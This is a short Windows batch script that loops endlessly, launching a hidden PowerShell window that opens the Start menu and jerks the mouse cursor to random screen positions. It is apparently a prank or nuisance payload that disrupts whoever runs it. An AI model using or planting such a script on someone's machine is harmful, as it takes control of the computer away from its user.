:start
set /a x=%random% %% 1920
set /a y=%random% %% 1080
powershell.exe -w hidden "$wshell = New-Object -ComObject wscript.shell; $wshell.SendKeys('^{ESC}'); [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(%x%, %y%)"
goto start
